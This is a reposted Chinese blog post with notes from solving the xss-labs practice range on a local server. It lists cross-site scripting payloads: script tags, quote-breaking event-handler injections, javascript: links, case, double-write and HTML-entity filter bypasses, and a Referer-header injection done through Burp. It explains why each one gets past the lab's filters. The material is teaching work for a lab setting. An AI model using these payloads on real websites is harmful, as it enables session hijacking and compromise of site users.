@@ -1,0 +1,100 @@
+<!-- Post: XSS笔记 | ID: 2025-014 | Created: 2025-03-12 | Tags: tech | Source: CSDN sinat_36912383 -->
+
+<blockquote>本文复刻自 <a href="https://blog.csdn.net/sinat_36912383/article/details/146138898" target="_blank" rel="noopener">CSDN 博主 sinat_36912383</a> 的原创文章，原文发布于 2025-03-12。</blockquote>
+
+<h3>靶场环境部署</h3> 
+<ul><li><a href="https://www.xp.cn/php-study" rel="nofollow">phpstudy(网页运行环境)</a></li><li><a href="https://github.com/do0dl3/xss-labs">xss-libs</a><br> <img src="https://i-blog.csdnimg.cn/direct/0f9a8b6f52b44503827ca60ffea10b42.png" alt="在这里插入图片描述"></li></ul> 
+<h3>用到的payload</h3> 
+<pre><code class="prism language-html">jankin<script> alert('a')</script> 
+jankin"><script>alert('a') </script>// 
+jankin'onmousemove='alert(/a/)'" 
+jankin"onmousemove='alert(/a/)' <!-- 属性事件执行js-->
+
+'"><
+"><a href="javascript:alert('1')">jankin</a>" <!-- 超链接 构造伪协议执行js-->
+
+"><a Href="javascript:alert('1')"> jankin</a>" <!-- 大小写绕过执行js-->
+
+"><a hrhrefef="javascripscriptt:alert('1')"> jankin</a>" <!-- 双写绕过执行js-->
+
+&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x31;&#x27;&#x29; <!--javascript:alert('1')的html编码绕过-->
+
+&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69; &#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x31;&#x27;&#x29;//http:// <!-- 检测是否存在关键字 加入关键字 绕过执行js-->
+
+t_sort='"onmousemove='alert(/1/)' type="text"// <!--隐藏的参数寻找，表单隐藏属性-->
+
+</code></pre> 
+<h3>方法集锦</h3> 
+<h4>基本思路，先插再说</h4> 
+<p><img src="https://i-blog.csdnimg.cn/direct/7787d460c2934f928e967a5b6f3cfeb1.png" alt="在这里插入图片描述"></p> 
+<ul><li>找到含有的html位置</li></ul> 
+<p><img src="https://i-blog.csdnimg.cn/direct/9d33d5234a07428b80a483313a770eec.png" alt="在这里插入图片描述"></p> 
+<ul><li>元素闭合绕过</li></ul> 
+<p><img src="https://i-blog.csdnimg.cn/direct/e7de0c5ad78b4a88b42ae683f2cbda16.png" alt="在这里插入图片描述"></p> 
+<h4>如下如何绕过</h4> 
+<p><img src="https://i-blog.csdnimg.cn/direct/078f53412b2542eea39f75e1d5532fe0.png" alt="在这里插入图片描述"></p> 
+<p><img src="https://i-blog.csdnimg.cn/direct/24350d8580d64ae5af458bbcfcd25f62.png" alt="在这里插入图片描述"><br> <a href="https://www.runoob.com/tags/ref-eventattributes.html" rel="nofollow">事件属性</a><br> 你使用的绕过方式：</p> 
+<pre><code class="prism language-html">'onmousemove='alert(/a/)'"
+</code></pre> 
+<p>成功触发了 XSS，说明原有的过滤机制存在漏洞，下面是详细分析。</p> 
+<hr> 
+<h5><strong>1. 过滤机制分析</strong></h5> 
+<p>你的输入：</p> 
+<pre><code class="prism language-html"><script>alert('a')</script>
+</code></pre> 
+<p>被服务器处理后变成：</p> 
+<pre><code class="prism language-html"><input name="keyword" value="<script>alert(" a')&lt;="" script&gt;'=""> 
+</code></pre> 
+<p>说明：</p> 
+<ol><li><strong><code><script></code> 被保留</strong>，但 <code>></code> 被转义成 <code>&gt;</code>，这表明服务器可能是 <strong>基于 HTML 转义</strong> 来防止 XSS，而不是彻底移除 <code><script></code> 标签。</li><li><strong><code>alert('a')</code> 变成 <code>alert(" a')</code></strong>，说明服务器在处理 <strong>单引号 <code>'</code> 和双引号 <code>"</code></strong> 时有问题。</li><li><strong>输入内容嵌入到 <code>value="..."</code> 里</strong>，所以 <strong>突破 <code>value="..."</code> 的限制</strong> 可能是绕过的关键。</li></ol> 
+<hr> 
+<h5><strong>2. 为什么 <code>'onmousemove='alert(/a/)'</code> 能绕过？</strong></h5> 
+<p>你的最终 XSS 代码：</p> 
+<pre><code class="prism language-html">'onmousemove='alert(/a/)'"
+</code></pre> 
+<p>分析：</p> 
+<ul><li>由于服务器错误地解析 <strong>单引号 <code>'</code> 和双引号 <code>"</code></strong>，我们可以<strong>人为地闭合 <code>value="..."</code> 的引号</strong>，然后插入一个新的 HTML 事件。</li><li>在 <code><input></code> 标签中，<code>onmousemove</code> 是一个合法的 <strong>鼠标移动事件</strong>，可以触发 <code>alert(/a/)</code>。</li><li><strong><code>alert(/a/)</code> 而不是 <code>alert('a')</code> 的原因</strong>： 
+ <ul><li>某些 WAF 可能会拦截 <code>alert('a')</code>，但不会拦截 <code>alert(/a/)</code>，因为 <strong>正则表达式 <code>/a/</code> 不是常见的 XSS payload</strong>，从而绕过了过滤。</li></ul> </li></ul> 
+<hr> 
+<h5><strong>3. XSS 触发流程</strong></h5> 
+<p>假设最终的 HTML 结构变成：</p> 
+<pre><code class="prism language-html"><input name="keyword" value="X" onmousemove="alert(/a/)">
+</code></pre> 
+<ul><li><strong>用户鼠标移动到 <code>input</code> 框上</strong> 时，触发 <code>onmousemove</code>，执行 <code>alert(/a/)</code>，从而成功执行 XSS。</li></ul> 
+<hr> 
+<h5><strong>4. 其他可能的绕过方式</strong></h5> 
+<p>如果 <code>onmousemove</code> 被拦截，可以尝试：</p> 
+<pre><code class="prism language-html">'onfocus='alert(1)' autofocus="
+</code></pre> 
+<ul><li>这里 <code>autofocus</code> 让 <code>input</code> 框在页面加载时自动获得焦点，触发 <code>onfocus="alert(1)"</code>。</li></ul> 
+<p>如果事件属性受到严格过滤，可以尝试：</p> 
+<pre><code class="prism language-html">" onclick="eval('alert(1)')"
+</code></pre> 
+<p>或者：</p> 
+<pre><code class="prism language-html"><img src=x onerror="alert(1)">
+</code></pre> 
+<hr> 
+<h5><strong>5. 结论</strong></h5> 
+<ul><li>你的绕过方式 <code>onmousemove='alert(/a/)'</code> 成功的关键在于： 
+ <ul><li><strong>错误闭合 <code>value="..."</code> 的引号</strong>，让 <code>onmousemove</code> 变成了新的 HTML 事件。</li><li><strong>使用 <code>alert(/a/)</code> 而不是 <code>alert('a')</code> 避免 WAF 拦截</strong>。</li><li><strong>事件 <code>onmousemove</code> 不受过滤</strong>，可以直接执行 JavaScript 代码。</li></ul> </li></ul> 
+<p>这说明：</p> 
+<ul><li>服务器的 XSS 过滤机制基于 <strong>HTML 转义</strong>，但对 <strong>引号解析和事件注入处理不当</strong>，导致绕过成功。</li><li><strong>攻击者可以通过引号闭合 + 事件属性注入 + 变种 <code>alert()</code> 形式绕过防护</strong>。</li></ul> 
+<p>如果需要更进一步的绕过方式，可以继续测试 <strong>其他 HTML 事件</strong>（如 <code>onmouseover</code>、<code>onfocus</code>），以及 <strong>更隐蔽的 payload</strong>（如 <code>eval()</code> 或 <code>setTimeout()</code>）。</p> 
+<h4>html编码绕过</h4> 
+<p><img src="https://i-blog.csdnimg.cn/direct/7b588435f42243679a7a5f63bd8a698a.png" alt="在这里插入图片描述"></p> 
+<p>html编码会被前端自动识别，前端会自动识别</p> 
+<p><img src="https://i-blog.csdnimg.cn/direct/781f7fa2aa4641c2966ce858c338bf60.png" alt="在这里插入图片描述"></p> 
+<h4>参数不合法</h4> 
+<p><img src="https://i-blog.csdnimg.cn/direct/5ddb733598d348be960343c3ac85b17a.png" alt="在这里插入图片描述"></p> 
+<p><img src="https://i-blog.csdnimg.cn/direct/95057f38ce41466da04059f5dc5a1bf1.png" alt="在这里插入图片描述"></p> 
+<h4>HTTP_REFERER</h4> 
+<p><img src="https://i-blog.csdnimg.cn/direct/71495015b1374d069f7e08c33fac702c.png" alt="在这里插入图片描述"></p> 
+<h5>抓包</h5> 
+<p><img src="https://i-blog.csdnimg.cn/direct/4bec394b074d49e69ad6e8abf7783e12.png" alt="在这里插入图片描述"></p> 
+<h5>增加payload构造请求</h5> 
+<pre><code>Referer:'"onmousemove='alert(/1/)' type="text"// 
+</code></pre> 
+<p><img src="https://i-blog.csdnimg.cn/direct/a0b2ff77925846c986dcec3be0b52750.png" alt="在这里插入图片描述"></p> 
+<p><img src="https://i-blog.csdnimg.cn/direct/6cb701cb84c746889bbe4918455c2d1b.png" alt="在这里插入图片描述"><br> 复制出<br> http://burpsuite/repeat/1/a2x5lukxe71j8vfq4uaoowsifeffj7we</p> 
+<p>关掉抓包，访问http://localhost/level11.php?keyword=good%20job!，然后访问http://burpsuite/repeat/1/a2x5lukxe71j8vfq4uaoowsifeffj7we<br> <img src="https://i-blog.csdnimg.cn/direct/f955ac09a8f3488e8d5391a705bbac06.png" alt="在这里插入图片描述"></p> 
+<p>就会ok</p>
